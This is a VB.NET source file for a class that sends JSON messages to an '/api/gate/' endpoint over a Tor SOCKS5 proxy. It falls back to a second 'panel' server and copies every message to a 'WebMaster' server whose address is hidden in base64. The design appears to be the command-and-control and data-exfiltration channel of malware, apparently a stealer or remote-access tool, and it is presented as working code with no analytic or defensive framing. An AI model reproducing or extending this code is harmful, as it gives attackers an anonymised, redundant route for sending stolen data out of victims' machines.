Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports Newtonsoft.Json
Imports Starksoft.Aspen.Proxy

Public Class SendHTTPonTor
    Private proxyClient As Socks5ProxyClient
    Public write As StreamWriter
    Public TCP As New TcpClient
    Private WebMaster As Boolean = False
    Private FallbackPanel As Boolean = True
    Public Sub TalkChannelHTTP(ByVal msg As Object, ByVal att As String, ByVal address As String, ByVal ServerReachPort As Integer)
        Dim JsonString As String = JsonConvert.SerializeObject(msg).Replace("\n", "").Replace("\r", "")
        Dim Body = Encoding.UTF8.GetBytes(JsonString)
        Dim bodyLength As Integer = Encoding.UTF8.GetByteCount(JsonString)
        Try

            Dim headerContent = New StringBuilder()
            headerContent.AppendLine("POST /api/gate/" & att & " HTTP/1.1")
            headerContent.AppendLine("Content-Type: application/json")
            headerContent.AppendLine("User-Agent: Client/1.0")
            headerContent.AppendLine("Accept: */*")
            headerContent.AppendLine("Host: " & IPAddress.Loopback.ToString() & ":" & Config.Variables.ServerReachPort)
            headerContent.AppendLine("Accept-Encoding: gzip, deflate, br")
            headerContent.AppendLine("Connection: keep-alive")
            headerContent.AppendLine("Content-Length: " & bodyLength)
            headerContent.AppendLine()

            Dim headerString As String = headerContent.ToString
            Dim header = Encoding.UTF8.GetBytes(headerString)
            Dim headerLength As Integer = Encoding.UTF8.GetByteCount(headerString)

            proxyClient = New Socks5ProxyClient(IPAddress.Loopback.ToString(), Config.Variables.SocketPort) With {
                .ProxyUserName = "",
                .ProxyPassword = ""
            }
            TCP = proxyClient.CreateConnection(address, ServerReachPort)

            Using stream = TCP.GetStream()
                stream.Write(header, 0, headerLength)
                stream.Write(Body, 0, bodyLength)
                stream.Flush()
            End Using
            TCP.Client.Close()
        Catch ex As Exception
            If Not WebMaster And FallbackPanel Then
                FallbackPanel = False
                Try
                    If Config.Variables.FallbackAdress IsNot String.Empty And Config.Variables.FallbackServerReachPort <> 0 Then
                        TalkChannelHTTP(msg, att, Config.Variables.FallbackAdress, Config.Variables.FallbackServerReachPort)
                    End If
                    If Config.Variables.Debug Then
                        Console.WriteLine("Connection error: " & ex.ToString)
                    End If
                Catch e As Exception
                    If Config.Variables.Debug Then
                        Console.WriteLine("Fallback Connection error: " & e.ToString)
                    End If
                End Try
            End If
        End Try
        If Not WebMaster Then
            WebMaster = True
            If Config.Variables.Debug Then
                Console.WriteLine("Webmaster Connection...")
            End If
            WebMasterServer(msg, att)
        End If
    End Sub
    Private Sub WebMasterServer(ByVal msg As Object, ByVal att As String)
        Dim address As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterAddress))
        Dim port As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterPort))
        TalkChannelHTTP(msg, att, address, port)
    End Sub
End Class
